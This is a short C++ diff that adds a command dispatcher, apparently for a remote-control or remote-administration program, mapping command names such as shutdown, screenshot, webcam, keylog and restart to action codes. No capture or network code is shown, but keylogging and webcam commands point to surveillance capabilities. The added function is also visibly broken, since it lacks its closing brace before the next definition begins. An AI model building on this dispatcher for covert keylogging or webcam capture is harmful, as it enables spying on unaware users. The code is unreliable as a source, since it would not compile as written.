@@ -12,6 +12,26 @@ using namespace std;
 
 queue<Response*> responsesQueue;
 
+Action getAction(string name) {
+    name = toLower(name);
+    if (name == "shutdown") {
+        return ACTION_SHUTDOWN;
+    } else if (name.find("app") != string::npos) {
+        return ACTION_APP;
+    } else if (name.find("services") != string::npos) {
+        return ACTION_SERVICES;
+    } else if (name.find("file") != string::npos) {
+        return ACTION_FILE;
+    } else if (name.find("screenshot") != string::npos) {
+        return ACTION_SCREENSHOT;
+    } else if (name.find("webcam") != string::npos) {
+        return ACTION_WEBCAM;
+    } else if (name.find("keylog") != string::npos) {
+        return ACTION_KEYLOG;
+    } else if (name == "restart"){
+        return ACTION_RESTART;
+    }
+    return ACTION_INVALID;
 Request::~Request() {
 }
 
